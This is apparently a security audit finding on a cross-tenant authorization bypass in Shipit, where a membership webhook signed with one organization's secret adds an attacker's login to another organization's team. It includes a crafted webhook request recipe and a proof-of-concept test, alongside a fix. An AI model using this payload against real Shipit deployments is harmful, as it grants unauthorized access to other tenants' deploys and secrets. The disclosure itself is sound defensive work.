## Answer

The claimed break in binding is real: `verify_signature` validates the HMAC against **O_attacker's** own `webhook_secret`, while `MembershipHandler#find_or_create_team!` mutates a `Team` row scoped to **O_victim**, because the lookup key is the bare, org-agnostic `github_id` field.

### Finding Description

Binding that should hold but doesn't:
`(organization whose GitHub App secret verified the webhook) == (organization that owns the Team row being mutated)`

**Path:**

1. `WebhooksController#verify_signature` resolves the signing org purely from the payload's `repository.owner.login` / `organization.login`, and fetches that org's own `GitHubApp` config to verify the HMAC: [1](#0-0) [2](#0-1) 

2. `Shipit.github(organization:)` in a multi-tenant ("Using Multiple GitHub Applications") deployment looks up a per-organization config, including a per-organization `webhook_secret`, so O_attacker's legitimately-installed app credentials only ever authenticate as O_attacker: [3](#0-2) 

3. Once signature verification passes (correctly, for O_attacker), `MembershipHandler#process` runs and resolves the team purely by GitHub's globally-unique numeric `team.id`, with **no organization scoping in the lookup**: [4](#0-3) 

Since `Team.find_or_create_by!(github_id: params.team.id)` matches on `github_id` alone, if a `Team` row already exists for that `github_id` (belonging to O_victim), the `do |team| ... end` block (which would set `team.organization = params.organization.login`) never executes — the existing O_victim-owned row is returned untouched, and `team.add_member(member)` inserts a `Membership` binding the attacker's GitHub login to O_victim's team.

**Attacker request:** POST `/webhooks` with `X-Github-Event: membership`, signed with O_attacker's real webhook secret, body `{action: 'added', team: {id: <O_victim's team github_id>, ...}, organization: {login: 'O_attacker'}, member: {login: 'attacker_login'}}`.

**Why guards fail:** `verify_signature` only checks that *some* signature matches *some* org's secret matching the payload's claimed org — it never checks that the `team.id` referenced belongs to that same org. `find_or_create_by!` has no `organization:` in its lookup keys, unlike `find_or_create_by_handle`, which does scope by organization+slug: [5](#0-4) . `User#authorized?` trusts team membership without re-validating provenance: [6](#0-5) .

### Impact Explanation

If O_victim's team (github_id T) is part of the Shipit operator's configured `Shipit.github_teams` (built from `github.oauth.teams` config, e.g. `O_victim/some-team`) [7](#0-6) , the attacker gains a `Membership` row for their own `User`, and `authorized?` returns true, granting them full access to the shared Shipit instance and all tenants' stacks, deploys, and secrets — an authorization-boundary break across tenants in a documented multi-organization Shipit deployment. This matches the "escalation into `Shipit.github_teams` authorization" High-severity category, and arguably also the Critical "payload for one repository mutating another's stack, commit, task or team" category since it's a cross-tenant `Team`/`Membership` write.

### Likelihood Explanation

Requires Shipit configured for multiple GitHub organizations (the documented multi-org schema) where the attacker legitimately administers and has installed the Shipit GitHub App on one of the trusted orgs — a realistic precondition for any shared/multi-tenant Shipit instance. The attacker needs the numeric `github_id` of the victim's team, which is discoverable via GitHub's team APIs/URLs or brute-forced (globally sequential integers). No other secrets are needed; the attack is a single crafted, correctly-signed webhook POST and is fully repeatable/parallelizable against any team ID.

### Recommendation

Scope the team lookup by organization, not just `github_id`: e.g. `Team.find_or_create_by!(github_id: params.team.id, organization: params.organization.login)`, or verify that an existing team's `organization` matches `params.organization.login` before applying `add_member`/`delete`, raising/dropping the event on mismatch.

### Proof of Concept

```ruby
# test/controllers/webhooks_controller_test.rb (conceptual addition)
test "membership webhook cannot bind attacker's login to another organization's pre-existing team" do
  victim_team = shipit_teams(:shopify_developers) # organization: 'shopify', github_id: e.g. 41
  Shipit.stubs(:github_teams).returns([victim_team])

  @request.headers['X-Github-Event'] = 'membership'
  # Signature stubbed valid for 'attacker-org' per GithubHook.any_instance.stubs(:verify_signature).returns(true) in setup
  body = {
    action: 'added',
    team: { id: victim_team.github_id, name: victim_team.name, slug: victim_team.slug, url: victim_team.api_url },
    organization: { login: 'attacker-org' },
    member: { login: 'attacker_login' }
  }.merge(repository: { owner: { login: 'attacker-org' } }).to_json

  post :create, body:, as: :json
  assert_response :ok

  attacker_user = Shipit::User.find_by(login: 'attacker_login')
  assert Shipit::Membership.exists?(team_id: victim_team.id, user: attacker_user)
  assert attacker_user.authorized?
  # Root cause assertion: team.organization was NOT overwritten and attacker never signed for 'shopify'
  assert_equal 'shopify', victim_team.reload.organization
end
```

### Citations

**File:** app/controllers/shipit/webhooks_controller.rb (L24-30)
```ruby
    def verify_signature
      github_app = Shipit.github(organization: repository_owner)
      verified = github_app.verify_webhook_signature(
        request.headers['X-Hub-Signature'],
        request.raw_post
      )
      head(422) unless verified
```

**File:** app/controllers/shipit/webhooks_controller.rb (L59-62)
```ruby
    def repository_owner
      # Fallback to the organization sub-object if repository isn't included in the payload
      params.dig('repository', 'owner', 'login') || params.dig('organization', 'login')
    end
```

**File:** lib/shipit.rb (L170-181)
```ruby
  def github(organization: github_default_organization)
    # Backward compatibility
    # nil signifies the single github app config schema is being used
    if github_default_organization.nil?
      config = secrets.github
    else
      config = github_app_config(organization)
      raise GithubOrganizationUnknown, organization if config.nil?
    end
    @github ||= {}
    @github[organization] ||= GitHubApp.new(organization, config)
  end
```

**File:** lib/shipit.rb (L256-258)
```ruby
  def github_teams
    @github_teams ||= github.oauth_teams.map { |t| Team.find_or_create_by_handle(t) }
  end
```

**File:** app/models/shipit/webhooks/handlers/membership_handler.rb (L22-43)
```ruby
        def process
          team = find_or_create_team!
          member = User.find_or_create_by_login!(params.member.login)

          case params.action
          when 'added'
            team.add_member(member)
          when 'removed'
            team.members.delete(member)
          else
            raise ArgumentError, "Don't know how to perform action: `#{action.inspect}`"
          end
        end

        private

        def find_or_create_team!
          Team.find_or_create_by!(github_id: params.team.id) do |team|
            team.github_team = params.team
            team.organization = params.organization.login
          end
        end
```

**File:** app/models/shipit/team.rb (L17-21)
```ruby
    class << self
      def find_or_create_by_handle(handle)
        organization, slug = handle.split('/').map(&:downcase)
        find_by(organization:, slug:) || fetch_and_create_from_github(organization, slug)
      end
```

**File:** app/models/shipit/user.rb (L80-82)
```ruby
    def authorized?
      @authorized ||= Shipit.github_teams.empty? || teams.where(id: Shipit.github_teams.map(&:id)).exists?
    end
```
